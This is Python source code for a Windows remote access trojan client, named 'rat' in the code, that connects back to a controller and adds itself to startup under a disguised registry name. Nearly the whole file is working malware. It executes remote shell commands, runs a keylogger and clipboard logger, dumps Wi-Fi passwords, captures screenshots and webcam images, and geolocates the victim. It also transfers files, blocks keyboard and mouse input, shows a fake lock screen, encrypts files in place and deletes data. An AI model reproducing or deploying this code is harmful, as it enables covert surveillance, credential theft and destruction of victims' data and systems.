import io
import random
import socket, subprocess, os, platform
from threading import Thread
from PIL import Image, ImageGrab
from datetime import datetime
from winreg import *
import shutil
import glob
import ctypes
import sys
import webbrowser
import re
import pyautogui
import cv2
import urllib.request
import json
from pynput.keyboard import Listener
from pynput.mouse import Controller
import time
import keyboard
import getpass
import ctypes
import win32api, win32con
import pyperclip
import tkinter as tk
from tkinter import messagebox
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
import winreg as wreg  
from cryptography.fernet import Fernet

cipher_suite = Fernet("udkCdg78s5vf_6J24ebqm3NdBDPdv-6DIF05OSE0gHQ=")

user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2
BUFFER_SIZE = 1024


class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()
        self.INITIAL_FOLDER = os.getcwd()
        self.BUFFER_SIZE = 1024

    def build_connection(self):
        global s
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.host, self.port))
                break  # Exit the loop if the connection is successful
            except ConnectionRefusedError:
                print("Connection refused. Retrying in 5 seconds...")
                time.sleep(5)
            except Exception as e:
                print(f"An error occurred while connecting: {e}")
                time.sleep(5)

        print("Connected to the server.")
    def send_data(self, data, s):
        if isinstance(data, str):
            data = data.encode()  
        data_size = len(data)
        size_bytes = data_size.to_bytes(4, 'big')
        if data_size <= self.BUFFER_SIZE:
            s.send(size_bytes + data)
        else:
            s.send(size_bytes)
            remaining_size = data_size
            offset = 0
            while remaining_size > 0:
                chunk_size = min(remaining_size, self.BUFFER_SIZE)
                chunk = data[offset:offset + chunk_size]
                s.send(chunk)
                offset += chunk_size
                remaining_size -= chunk_size

    def recv_data(self, s):
        size_bytes = s.recv(4)
        data_size = int.from_bytes(size_bytes, 'big')

        received_data = bytearray()

        while len(received_data) < data_size:
            remaining_size = data_size - len(received_data)
            chunk_size = min(remaining_size, self.BUFFER_SIZE)
            chunk = s.recv(chunk_size)
            received_data.extend(chunk)

        return bytes(received_data)

    def errorsend(self):
        output = bytearray("no output", encoding='utf8')
        for i in range(len(output)):
            output[i] ^= 0x41
        s.send(output)

    def keylogger(self):
        def on_press(key):
            if klgr == True:
                with open('keylogs.txt', 'a') as f:
                    f.write(f'{key}')
                    f.close()

        with Listener(on_press=on_press) as listener:
            listener.join()

    def clipboard(self):
        list = []
        while True:
            if pyperclip.paste() != 'None':
                TempVal = pyperclip.paste()  #

            if TempVal not in list:
                list.append(TempVal)
                with open('clipboard.txt', 'a') as f:
                    f.write(f'{TempVal}')
                    f.write('\n')
                    f.close()
            time.sleep(5)
    def collect_wifi_passwords(self):
        try:
            result = subprocess.check_output("netsh wlan show profile key=clear", shell=True, text=True)
            encrypted_message = cipher_suite.encrypt(result.encode())
            self.send_data(encrypted_message, s)
        except subprocess.CalledProcessError as e:
            print(f"Command failed with error: {e}")
            encrypted_message = cipher_suite.encrypt(str(e).encode())
            self.send_data(encrypted_message, s)
    def disable_all(self):
        while True:
            user32.BlockInput(True)

    def disable_mouse(self):
        mouse = Controller()
        t_end = time.time() + 3600 * 24 * 11
        while time.time() < t_end and mousedbl == True:
            mouse.position = (0, 0)

    def disable_keyboard(self):
        for i in range(150):
            if kbrd == True:
                keyboard.block_key(i)
        time.sleep(999999)

    def add_to_startup(self):
        path = os.getcwd().strip('/n')  
        
        Null, userprof = subprocess.check_output('set USERPROFILE', shell=True,stdin=subprocess.PIPE,  stderr=subprocess.PIPE).decode().split('=')  
        
        destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'  
        
        if not os.path.exists(destination):  
            shutil.copyfile(path+'\client.exe', destination)  
        
            key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)  
            wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)  
            key.Close()  
	  
    def lock_pc(self):
        global kbrd
        window = tk.Tk()

        # Function to handle window close event
        def on_close():
            window.destroy()

        # Function to handle button click event
        def on_button_click(character):
            password_entry.insert(tk.END, character)

        # Function to handle submit button click event
        def on_submit():
            entered_password = password_entry.get()
            if entered_password.lower() == "password":  # Replace "password" with your desired password
                kbrd = False
                messagebox.showinfo("Success", "Correct password entered. Window will be closed.")
                window.destroy()
            else:
                messagebox.showerror("Incorrect Password", "The entered password is incorrect.")
                password_entry.delete(0, tk.END)  # Clear the password entry field

        # Disable keyboard input in the password entry field
        def disable_keyboard(event):
            return "break"

        # Configure window settings
        window.title("Password Protected Window")

        # Get information about each monitor
        window.attributes('-fullscreen', True)  # Maximize window on the screen

        # Create lock label
        lock_label = tk.Label(window, text="🔒 Locked", font=("Arial", 50))
        lock_label.pack(pady=20)

        # Create password label and entry field
        password_label = tk.Label(window, text="Enter password to close:")
        password_label.pack()
        password_entry = tk.Entry(window, show="*")
        password_entry.pack(pady=10)

        # Disable keyboard input in the password entry field
        password_entry.bind("<Key>", disable_keyboard)

        # Keyboard buttons
        buttons = [
            ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0'],
            ['Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P'],
            ['A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L'],
            ['Z', 'X', 'C', 'V', 'B', 'N', 'M'],
        ]

        # Create keyboard buttons
        for row in buttons:
            button_frame = tk.Frame(window)
            button_frame.pack(pady=5)

            for character in row:
                button = tk.Button(button_frame, text=character, width=5, height=2,
                                   command=lambda char=character: on_button_click(char))
                button.pack(side=tk.LEFT, padx=5)

        # Create submit button
        submit_button = tk.Button(window, text="Submit", command=on_submit)
        submit_button.pack(pady=10)

        # Bind Enter key press to submit function
        window.bind('<Return>', lambda event: on_submit())

        # Configure window close event
        window.protocol("WM_DELETE_WINDOW", on_close)

        # Display the window on the screen and start the event loop
        window.mainloop()
    def execute(self):
        while True:
            # command = s.recv(BUFFER_SIZE).decode()
            encrypted_message = s.recv(BUFFER_SIZE)
            command = cipher_suite.decrypt(encrypted_message).decode('utf-8')
            if command[:4] == 'exec':
                try:
                    result = subprocess.check_output(command[5:], shell=True, text=True)
                    encrypted_message = cipher_suite.encrypt(result.encode())
                    self.send_data(encrypted_message, s)
                except subprocess.CalledProcessError as e:
                    print(f"Command failed with error: {e}")
                    encrypted_message = cipher_suite.encrypt(str(e).encode())
                    self.send_data(encrypted_message, s)

            elif command == 'screenshare':
                try:
                    from vidstream import ScreenShareClient
                    screen = ScreenShareClient(self.host, 8080)
                    screen.start_stream()
                except:
                    self.send_data("Impossible to get screen", s)


            elif command == 'webcam':
                try:
                    from vidstream import CameraClient
                    cam = CameraClient(self.host, 8080)
                    cam.start_stream()
                except:
                    self.send_data("Impossible to get webcam", s)

            elif command == 'breakstream':
                pass

            elif command == 'geolocate':
                with urllib.request.urlopen("https://geolocation-db.com/json") as url:
                    data = json.loads(url.read().decode())
                    link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
                encrypted_message = cipher_suite.encrypt(link.encode())
                self.send_data(encrypted_message, s)

            elif command == 'usbdrivers':
                p = subprocess.check_output(
                    ["powershell.exe", "Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }"],
                    encoding='utf-8')
                encrypted_message = cipher_suite.encrypt(p.encode())
                self.send_data(encrypted_message, s)

            elif command == 'monitors':
                p = subprocess.check_output(
                    ["powershell.exe", "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"],
                    encoding='utf-8')
                encrypted_message = cipher_suite.encrypt(p.encode())
                self.send_data(encrypted_message, s)

            elif command == 'sysinfo':
                sysinfo = str(f'''
                System: {platform.platform()} {platform.win32_edition()}
                Architecture: {platform.architecture()}
                Name of Computer: {platform.node()}
                Processor: {platform.processor()}
                Python: {platform.python_version()}
                Java: {platform.java_ver()}
                User: {os.getlogin()}
                                ''')
                output = sysinfo
                encrypted_message = cipher_suite.encrypt(output.encode())
                self.send_data(encrypted_message, s)


            elif command == 'reboot':
                os.system("shutdown /r /t 1")
                output = f'{socket.gethostbyname(socket.gethostname())} is being rebooted'
                encrypted_message = cipher_suite.encrypt(output.encode())
                self.send_data(encrypted_message, s)

            elif command[:8] == 'readfile':
                try:
                    print(command[9:])
                    with open(command[9:], 'rb') as f:
                        data = f.read()
                        print(data)
                    if not data:
                        s.send("No data".encode().encode())
                    f.close()
                    self.send_data(data, s)
                except Exception as e:
                    self.send_data("No such file in directory", s)
                    print(e)
            elif command == 'pwd':
                curdir = str(os.getcwd())
                encrypted_message = cipher_suite.encrypt(curdir.encode())
                self.send_data(encrypted_message, s)

            elif command == 'ipconfig':
                output = subprocess.check_output('ipconfig', encoding='oem')
                encrypted_message = cipher_suite.encrypt(output.encode())
                self.send_data(encrypted_message, s)

            elif command == 'portscan':
                output = subprocess.check_output('netstat -an', encoding='oem')
                encrypted_message = cipher_suite.encrypt(output.encode())
                self.send_data(encrypted_message, s)
            elif command == "collect_wifipass":
                self.collect_wifi_passwords()


            elif command == 'tasklist':
                output = subprocess.check_output('tasklist', encoding='oem')
                encrypted_message = cipher_suite.encrypt(output.encode())
                self.send_data(encrypted_message, s)

            elif command == 'profiles':
                try:
                    output = subprocess.check_output('netsh wlan show profiles', encoding='oem')
                    encrypted_message = cipher_suite.encrypt(output.encode())

                    self.send_data(encrypted_message, s)
                except subprocess.CalledProcessError as e:
                    error_message = str(e)  # Convert the exception object to a string
                    encrypted_message = cipher_suite.encrypt(error_message.encode())
                    self.send_data(encrypted_message, s)
                except Exception as e:
                    pass
            elif command == 'encrypt':
                filename = s.recv(BUFFER_SIZE).decode()
                pem_private_key = self.recv_data(s)
                private_key = serialization.load_pem_private_key(
                    pem_private_key,
                    password=None)
                public_key = private_key.public_key()
                with open(filename, 'rb') as f:
                    data = f.read()
                    f.close()
                ciphertext = public_key.encrypt(
                    data,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    ))
                with open(filename, 'wb') as f:
                    f.write(ciphertext)
                    f.close()


            elif command == 'systeminfo':
                output = subprocess.check_output(f'systeminfo', encoding='oem')
                encrypted_message = cipher_suite.encrypt(output.encode())
                self.send_data(encrypted_message, s)


            elif command == 'sendmessage':
                encrypted_message = s.recv(BUFFER_SIZE)
                message = cipher_suite.decrypt(encrypted_message).decode('utf-8')
                text = message.split(":")[0]
                title = message.split(":")[1]
                sending = 'MessageBox has appeared'
                encrypted_message = cipher_suite.encrypt(sending.encode())
                self.send_data(encrypted_message, s)
                user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)

            elif command.startswith("disable") and command.endswith("--all"):
                Thread(target=self.disable_all, daemon=True).start()
                sending = "Keyboard and mouse are disabled"
                encrypted_message = cipher_suite.encrypt(sending.encode())
                self.send_data(encrypted_message, s)

            elif command.startswith("disable") and command.endswith("--keyboard"):
                global kbrd
                kbrd = True
                Thread(target=self.disable_keyboard, daemon=True).start()
                sending = "Keyboard is disabled"
                encrypted_message = cipher_suite.encrypt(sending.encode())
                self.send_data(encrypted_message, s)

            elif command.startswith("disable") and command.endswith("--mouse"):
                global mousedbl
                mousedbl = True
                Thread(target=self.disable_mouse, daemon=True).start()
                sending = "Mouse is disabled"
                encrypted_message = cipher_suite.encrypt(sending.encode())
                self.send_data(encrypted_message, s)

            elif command.startswith("enable") and command.endswith("--keyboard"):
                kbrd = False
                sending = "Mouse and keyboard are unblocked"
                encrypted_message = cipher_suite.encrypt(sending.encode())
                self.send_data(encrypted_message, s)

            elif command.startswith("enable") and command.endswith("--mouse"):
                mousedbl = False
                sending = "Mouse is enabled"
                encrypted_message = cipher_suite.encrypt(sending.encode())
                self.send_data(encrypted_message, s)

            elif command.startswith("enable") and command.endswith("--all"):
                user32.BlockInput(False)
                sending = "Keyboard and mouse are enabled"
                encrypted_message = cipher_suite.encrypt(sending.encode())
                self.send_data(encrypted_message, s)
            elif command == 'keylogger_start':
                global klgr
                klgr = True
                Thread(target=self.keylogger, daemon=True).start()
                sending = "Keylogger is started"
                encrypted_message = cipher_suite.encrypt(sending.encode())
                self.send_data(encrypted_message, s)

            elif command == 'keylogger_send':
                try:
                    with open("keylogs.txt", 'r') as f:
                        data = f.read()
                    if not data:
                        s.send("No data".encode())
                    f.close()
                    self.send_data(data, s)
                    os.remove('keylogs.txt')
                except:
                    self.send_data("No such file in directory", s)


            elif command == 'keylogger_stop':
                klgr = False
                sending = "The session of keylogger is terminated"
                encrypted_message = cipher_suite.encrypt(sending.encode())
                self.send_data(encrypted_message, s)


            elif command == 'clipboard_start':
                global clipb
                clipb = True
                Thread(target=self.clipboard, daemon=True).start()
                sending = "CLipboard is started"
                encrypted_message = cipher_suite.encrypt(sending.encode())
                self.send_data(encrypted_message, s)

                # self.send_data("CLipboard is started", s)

            elif command == 'clipboard_send':
                try:
                    f = open("clipboard.txt", 'r')
                    lines = f.readlines()
                    f.close()
                    encrypted_message = cipher_suite.encrypt(str(lines).encode())
                    self.send_data(encrypted_message, s)

                    os.remove('clipboard.txt')
                except:
                    self.errorsend()
            elif command == 'clipboard_stop':
                clipb = False
                sending = "The session of clipboard is terminated"
                encrypted_message = cipher_suite.encrypt(sending.encode())
                self.send_data(encrypted_message, s)

            elif command == 'cpu_cores':
                output = str(os.cpu_count())
                encrypted_message = cipher_suite.encrypt(output.encode())
                self.send_data(encrypted_message, s)

            elif command[:7] == 'delfile':
                try:
                    os.remove(command[8:])
                    data = f'{command[8:]} was successfully deleted'
                    encrypted_message = cipher_suite.encrypt(data.encode())
                    self.send_data(encrypted_message, s)
                except:
                    self.errorsend()
            elif command[:2] == 'cd':
                command = command[3:]
                try:
                    os.chdir(command)
                    curdir = str(os.getcwd())
                    encrypted_message = cipher_suite.encrypt(curdir.encode())
                    self.send_data(encrypted_message, s)
                except:
                    self.send_data("No such directory", s)

            elif command == 'cd ..':
                os.chdir('..')
                curdir = str(os.getcwd())
                encrypted_message = cipher_suite.encrypt(curdir.encode())
                self.send_data(encrypted_message, s)
            elif command == 'dir' or command == 'ls':
                try:
                    output = subprocess.check_output(["dir"], shell=True)
                    output = output.decode('utf8', errors='ignore')
                    encrypted_message = cipher_suite.encrypt(output.encode())
                    self.send_data(encrypted_message, s)

                except:
                    self.errorsend()
            elif command == 'curpid':
                pid = os.getpid()
                encrypted_message = cipher_suite.encrypt(str(pid).encode())
                self.send_data(encrypted_message, s)

            elif command == 'drivers':
                drives = []
                bitmask = kernel32.GetLogicalDrives()
                letter = ord('A')
                while bitmask > 0:
                    if bitmask & 1:
                        drives.append(chr(letter) + ':\\')
                    bitmask >>= 1
                    letter += 1
                encrypted_message = cipher_suite.encrypt(str(drives).encode())
                self.send_data(encrypted_message, s)
            elif command == 'exit':
                data = f'{command[5:]} was terminated'
                encrypted_message = cipher_suite.encrypt(data.encode())
                self.send_data(encrypted_message, s)
                s.close()
                exit()

            elif command == 'shutdown':
                os.system('shutdown /s /t 1')
                self.send_data("", s)
            elif command == 'localtime':
                now = datetime.now()
                current_time = now.strftime("%H:%M:%S")
                data = str(current_time)
                encrypted_message = cipher_suite.encrypt(data.encode())
                self.send_data(encrypted_message, s)

            elif command[:10] == 'createfile':
                try:
                    data = f'{command[10:]} was created'
                    encrypted_message = cipher_suite.encrypt(data.encode())
                    self.send_data(encrypted_message, s)
                    with open(command[10:], 'w') as file:
                        pass
                except:
                    self.errorsend()

            elif command[:8] == 'download':
                try:
                    file = open(command.split(" ")[1], 'rb')
                    data = file.read()
                    self.send_data(data,s)
                except:
                    self.errorsend()

            elif command[:6] == 'upload':
                filepath = command.split(" ")[1]
                filename = os.path.basename(filepath) 
                newfile = open(f'{self.INITIAL_FOLDER}/{filename}', 'wb')
                data = self.recv_data(s)
                newfile.write(data)
                newfile.close()


            elif command[:5] == 'mkdir':
                try:
                    os.mkdir(command[6:])
                    data = f'Directory {command[6:]} was created'
                    encrypted_message = cipher_suite.encrypt(data.encode())
                    self.send_data(encrypted_message, s)
                    # self.send_data(data, s)

                except:
                    self.errorsend()

            elif command[:5] == 'rmdir':
                try:
                    shutil.rmtree(command[6:])
                    data = f'Directory {command[6:]} was removed'
                    encrypted_message = cipher_suite.encrypt(data.encode())
                    self.send_data(encrypted_message, s)
                    # self.send_data(data, s)

                except:
                    self.errorsend()

            elif command == 'browser':
                quiery = s.recv(BUFFER_SIZE)
                quiery = quiery.decode()
                try:
                    if re.search(r'\.', quiery):
                        webbrowser.open_new_tab('https://' + quiery)
                    elif re.search(r'\ ', quiery):
                        webbrowser.open_new_tab('https://yandex.ru/search/?text=' + quiery)
                    else:
                        webbrowser.open_new_tab('https://yandex.ru/search/?text=' + quiery)
                    self.send_data("The tab is opened", s)
                except:
                    self.errorsend()


            elif command == 'screenshot':
                try:
                    dirpath = os.getcwd()    
                    image_path = os.path.join(dirpath, "img.jpg")
                    ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG") 
                    with open(image_path, 'rb') as image_file:
                        data = image_file.read()
                    self.send_data(data,s)
                except FileNotFoundError as e:
                    print(f"File not found: {e}")
                except Exception as e:
                    print(f"An error occurred: {e}")
                finally:
                    try:
                        os.remove(image_path)  
                    except FileNotFoundError as e:
                        print(f"File not found when deleting: {e}")
                    except Exception as e:
                        print(f"Error deleting file: {e}")

            elif command == 'webcam_snap':
                try:
                    # Capture an image from the webcam
                    cam = cv2.VideoCapture(0)
                    return_value, image = cam.read()
                    cam.release()

                    if return_value:
                        image = cv2.resize(image, (1920, 1080))
                        pil_image = Image.fromarray(cv2.cvtColor(image, cv2.COLOR_BGR2RGB))
                        with io.BytesIO() as img_buffer:
                            pil_image.save(img_buffer, format="PNG")
                            img_data = img_buffer.getvalue()
                        self.send_data(img_data, s)
                    else:
                        self.errorsend()
                except Exception as e:
                    self.errorsend()

            elif command == 'lock_pc':
                Thread(target=self.lock_pc, daemon=True).start()
                self.send_data("pc locked", s)


rat = Client('127.0.0.1', 4444)

if __name__ == '__main__':
    rat.build_connection()
    rat.add_to_startup()
    rat.execute()
